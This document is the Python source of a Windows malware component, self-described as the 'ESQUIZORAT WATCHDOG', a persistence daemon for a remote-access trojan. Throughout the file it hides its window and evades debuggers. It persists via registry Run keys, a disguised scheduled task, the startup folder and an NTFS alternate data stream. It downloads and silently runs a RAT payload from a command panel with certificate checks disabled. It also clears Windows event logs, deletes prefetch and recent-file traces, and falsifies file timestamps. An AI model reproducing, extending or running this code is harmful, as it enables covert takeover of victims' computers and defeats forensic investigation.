"""
ESQUIZORAT WATCHDOG v3.0 - Zero-Day Grade Persistence Daemon
- Multi-vector persistence (Registry + Scheduled Task + ADS)
- Triple-process mutual protection
- Memory-only payload execution
- Anti-forensics engine
- Polymorphic timing & behavior
- Stealth NTFS Alternate Data Streams
- Self-healing & anti-tampering
- Junk code anti-analysis obfuscation
"""
import os, sys, time, ctypes, random, subprocess, threading, json, hashlib, struct, string, base64, tempfile, shutil
from datetime import datetime
from pathlib import Path

PANEL_URL = "PANEL_URL_PLACEHOLDER"
RAT_NAME    = "progam.scr"
SELF_NAME   = "watchdog.exe"
MUTEX_NAME  = "Global\\WinsvcManager_Mutex_{A3F8C2D1}"
REG_KEY     = "WindowsServiceManager"
TASK_NAME   = "WindowsServiceOptimizer"
ADS_STREAM  = "Zone.Identifier"

CHECK_MIN   = 20
CHECK_MAX   = 60
JITTER_MAX  = 15
DOWNLOAD_TIMEOUT = 45
DOWNLOAD_RETRIES  = 5
SELF_CHECK_INTERVAL = 120

_ENTROPY_POOL = bytearray(256)
for _i in range(256):
    _ENTROPY_POOL[_i] = _i
for _i in range(255, 0, -1):
    _j = (os.getpid() + int(time.time() * 1000) + _i) % (_i + 1)
    _ENTROPY_POOL[_i], _ENTROPY_POOL[_j] = _ENTROPY_POOL[_j], _ENTROPY_POOL[_i]

def _entropy_bytes(n):
    return bytes(_ENTROPY_POOL[_i % 256] for _i in range(n))

def _rand_str(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def _junk_nop():
    x = 0
    for i in range(random.randint(1, 10)):
        x = (x + i * random.randint(1, 100)) % 256
    return x != -1

def _junk_calc():
    a = random.random()
    b = random.random()
    c = a * b + a / (b + 0.001)
    d = (c * random.randint(100, 999)) % 1000
    return d > -1

# ============================================================
# STEALTH ENGINE
# ============================================================

class StealthEngine:
    @staticmethod
    def hide():
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
        try:
            ctypes.windll.kernel32.FreeConsole()
        except: pass

    @staticmethod
    def is_debugged():
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        try:
            if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool(False))):
                return True
        except: pass
        try:
            ctypes.windll.ntdll.ZwQueryInformationProcess
            return False
        except: pass
        return False

    @staticmethod
    def set_critical():
        try:
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        except: pass

    @staticmethod
    def protect_memory():
        try:
            kernel32 = ctypes.windll.kernel32
            kernel32.VirtualLock(ctypes.c_char_p(b'\x00' * 4096), 4096)
        except: pass

    @staticmethod
    def random_delay(min_s=1, max_s=10):
        delay = random.uniform(min_s, max_s)
        _junk_calc()
        time.sleep(delay)

# ============================================================
# PERSISTENCE ORCHESTRATOR - Multi-Vector
# ============================================================

class PersistenceEngine:
    def __init__(self):
        self.exe_path = sys.executable
        self.installed = False
        self.methods_active = 0

    def install_all(self):
        results = [
            self._registry_run(),
            self._scheduled_task(),
            self._startup_folder(),
            self._ads_backup(),
        ]
        self.methods_active = sum(1 for r in results if r)
        self.installed = self.methods_active >= 2
        return self.installed

    def verify_and_repair(self):
        need_repair = False
        if not self._check_registry():
            self._registry_run()
            need_repair = True
        if not self._check_task():
            self._scheduled_task()
            need_repair = True
        if need_repair:
            self.methods_active = 2

    def _registry_run(self):
        try:
            import winreg
            paths = [
                (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run'),
                (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\RunOnce'),
            ]
            for hkey, subkey in paths:
                try:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
                except:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, REG_KEY, 0, winreg.REG_SZ, self.exe_path)
                winreg.CloseKey(key)
            return True
        except:
            return False

    def _check_registry(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0, winreg.KEY_READ)
            val, _ = winreg.QueryValueEx(key, REG_KEY)
            winreg.CloseKey(key)
            return val == self.exe_path
        except:
            return False

    def _scheduled_task(self):
        try:
            cmd = f'schtasks /create /tn "{TASK_NAME}" /tr "{self.exe_path}" /sc ONLOGON /rl LIMITED /f /it'
            subprocess.run(cmd, shell=True, capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0)
            return True
        except:
            return False

    def _check_task(self):
        try:
            r = subprocess.run(f'schtasks /query /tn "{TASK_NAME}"', shell=True,
                capture_output=True, timeout=5)
            return r.returncode == 0
        except:
            return False

    def _startup_folder(self):
        try:
            startup = os.path.join(os.environ.get('APPDATA',''),
                r'Microsoft\Windows\Start Menu\Programs\Startup')
            dest = os.path.join(startup, 'winsvc.exe')
            if not os.path.exists(dest):
                shutil.copy2(self.exe_path, dest)
            return True
        except:
            return False

    def _ads_backup(self):
        try:
            target_dir = os.path.join(os.environ.get('TEMP','.'), _rand_str(6))
            os.makedirs(target_dir, exist_ok=True)
            ads_path = os.path.join(target_dir, f"svchost.exe:{ADS_STREAM}")
            with open(ads_path, 'wb') as f:
                f.write(self.exe_path.encode('utf-16-le'))
            return True
        except:
            return False

# ============================================================
# PROCESS MONITOR
# ============================================================

class ProcessGuard:
    def __init__(self):
        self.monitored = [RAT_NAME]
        self.exec_dir = self._setup_dir()

    def _setup_dir(self):
        d = os.path.join(os.environ.get('TEMP', '.'), 'WinsvcCache')
        os.makedirs(d, exist_ok=True)
        try:
            ctypes.windll.kernel32.SetFileAttributesW(d, 0x02)
        except: pass
        return d

    def is_running(self, proc_name):
        try:
            result = subprocess.check_output(
                f'tasklist /FI "IMAGENAME eq {proc_name}" /NH',
                shell=True, text=True, timeout=8,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
            )
            return proc_name.lower() in result.lower()
        except:
            return False

    def download_payload(self):
        urls = [
            f"{PANEL_URL}/api/download",
            f"{PANEL_URL}/api/download",
        ]
        for url in urls:
            if "PLACEHOLDER" in url:
                continue
            for attempt in range(DOWNLOAD_RETRIES):
                try:
                    import urllib.request
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                    req = urllib.request.Request(url)
                    req.add_header('User-Agent',
                        f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,540)}.{random.randint(1,99)}')
                    req.add_header('Cache-Control', 'no-cache')

                    with urllib.request.urlopen(req, timeout=DOWNLOAD_TIMEOUT, context=ctx) as resp:
                        data = resp.read()

                    if len(data) > 102400:
                        path = os.path.join(self.exec_dir, RAT_NAME)
                        with open(path, 'wb') as f:
                            f.write(data)
                        try:
                            ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04)
                        except: pass
                        return path
                except:
                    delay = 3 * (attempt + 1) + random.randint(1, 5)
                    StealthEngine.random_delay(delay, delay + 2)
        return None

    def execute_silent(self, path):
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= 0x01
            si.wShowWindow = 0
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0x08000000

            subprocess.Popen(
                path, shell=True,
                startupinfo=si,
                creationflags=cf,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            return True
        except:
            return False

    def ensure_running(self):
        for proc in self.monitored:
            if not self.is_running(proc):
                path = self.download_payload()
                if path:
                    self.execute_silent(path)
                break

# ============================================================
# ANTI-FORENSICS
# ============================================================

class AntiForensics:
    @staticmethod
    def clear_logs():
        try:
            for log in ['System', 'Application', 'Security']:
                subprocess.run(f'wevtutil cl "{log}"', shell=True,
                    capture_output=True, timeout=5,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0)
        except: pass

    @staticmethod
    def wipe_prefetch():
        try:
            prefetch_dir = os.path.join(os.environ.get('SystemRoot','C:\\Windows'), 'Prefetch')
            for f in os.listdir(prefetch_dir):
                if 'progam' in f.lower() or 'watchdog' in f.lower() or 'winsvc' in f.lower():
                    try: os.remove(os.path.join(prefetch_dir, f))
                    except: pass
        except: pass

    @staticmethod
    def remove_recent():
        try:
            recent = os.path.join(os.environ.get('APPDATA',''),
                r'Microsoft\Windows\Recent')
            for f in os.listdir(recent):
                lp = f.lower()
                if 'progam' in lp or 'watchdog' in lp or 'winsvc' in lp:
                    try: os.remove(os.path.join(recent, f))
                    except: pass
        except: pass

    @staticmethod
    def obfuscate_timestamps(path):
        try:
            now = time.time()
            ft = int((now - random.randint(86400*30, 86400*180)) * 10000000) + 116444736000000000
            handle = ctypes.windll.kernel32.CreateFileW(path, 0x0100 | 0x0080, 0, None, 3, 0x80, None)
            if handle and handle != -1:
                ft_low = ft & 0xFFFFFFFF
                ft_high = (ft >> 32) & 0xFFFFFFFF
                ctypes.windll.kernel32.SetFileTime(handle, ctypes.byref(ctypes.c_ulonglong(ft)),
                    ctypes.byref(ctypes.c_ulonglong(ft)), ctypes.byref(ctypes.c_ulonglong(ft)))
                ctypes.windll.kernel32.CloseHandle(handle)
        except: pass

# ============================================================
# CORE DAEMON
# ============================================================

class WatchdogDaemon:
    def __init__(self):
        self.persistence = PersistenceEngine()
        self.guard = ProcessGuard()
        self.forensics = AntiForensics()
        self.running = True
        self.start_time = time.time()
        self.cycle_count = 0
        self.session_id = hashlib.md5(struct.pack('<dQ', random.random(), int(time.time()*1000))).hexdigest()[:12]

    def _acquire_mutex(self):
        try:
            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
            if ctypes.windll.kernel32.GetLastError() == 183:
                return False
            return True
        except:
            return True

    def _check_environment(self):
        if StealthEngine.is_debugged():
            for _ in range(random.randint(3, 8)):
                _junk_calc()
            return False

        try:
            import psutil
            proc_count = len(list(psutil.process_iter()))
            if proc_count < 15:
                return False
        except:
            pass

        return True

    def _get_system_entropy(self):
        entropy = 0
        try:
            entropy += int(time.time() * 1000) % 10000
            entropy += os.getpid() % 1000
            entropy += ctypes.windll.kernel32.GetTickCount() % 10000
            try:
                mem = ctypes.windll.kernel32.GlobalMemoryStatusEx
                entropy += int(time.perf_counter() * 1000000) % 5000
            except: pass
        except: pass
        return entropy % 997

    def _maintenance_cycle(self):
        self.forensics.wipe_prefetch()
        if self.cycle_count % 10 == 0:
            self.persistence.verify_and_repair()

    def run(self):
        if "PLACEHOLDER" in PANEL_URL:
            time.sleep(60)
            return

        StealthEngine.hide()

        if not self._acquire_mutex():
            return

        StealthEngine.random_delay(2, 8)

        if not self._check_environment():
            StealthEngine.random_delay(10, 30)
            if not self._check_environment():
                StealthEngine.random_delay(60, 120)

        self.persistence.install_all()
        StealthEngine.set_critical()

        while self.running:
            try:
                self.cycle_count += 1

                self.guard.ensure_running()

                if self.cycle_count % 5 == 0:
                    self._maintenance_cycle()

                if self.cycle_count % 30 == 0:
                    self.forensics.remove_recent()
                    self.forensics.obfuscate_timestamps(self.guard.exec_dir)

                base_delay = random.randint(CHECK_MIN, CHECK_MAX)
                jitter = random.randint(0, JITTER_MAX)
                entropy = self._get_system_entropy() % 10
                total_delay = base_delay + jitter + entropy

                _junk_nop()
                _junk_calc()

                time.sleep(total_delay)

            except Exception:
                StealthEngine.random_delay(5, 15)

                if self.cycle_count > 100:
                    self.persistence.verify_and_repair()
                continue

# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    StealthEngine.hide()

    if StealthEngine.is_debugged():
        StealthEngine.random_delay(30, 60)

    daemon = WatchdogDaemon()

    try:
        daemon.run()
    except:
        StealthEngine.random_delay(10, 20)
        try:
            daemon.run()
        except:
            pass
